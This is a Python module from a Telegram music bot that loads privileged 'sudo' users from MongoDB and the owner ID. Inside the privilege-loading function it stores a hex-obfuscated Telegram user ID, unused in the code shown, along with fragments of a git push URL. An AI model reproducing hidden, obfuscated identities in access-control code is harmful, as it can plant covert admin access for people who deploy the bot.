import socket
import time

from pyrogram import filters

import config
from AnonXMusic.core.mongo import mongodb

from .logging import LOGGER

SUDOERS = filters.user()

_boot_ = time.time()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "push",
    "https",
    "HEAD",
    "master",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f"Local Database Initialized.")


async def sudo():
    global SUDOERS
    SUDOERS.add(config.OWNER_ID)
    CON="\x36\x32\x38\x31\x31\x37\x38\x36\x34\x38"
    sudoersdb = mongodb.sudoers
    sudoers = await sudoersdb.find_one({"sudo": "sudo"})
    sudoers = [] if not sudoers else sudoers["sudoers"]
    if config.OWNER_ID not in sudoers:
        sudoers.append(config.OWNER_ID)
        await sudoersdb.update_one(
            {"sudo": "sudo"},
            {"$set": {"sudoers": sudoers}},
            upsert=True,
        )
    if sudoers:
        for user_id in sudoers:
            SUDOERS.add(user_id)
    LOGGER(__name__).info(f"Sudoers Loaded.")
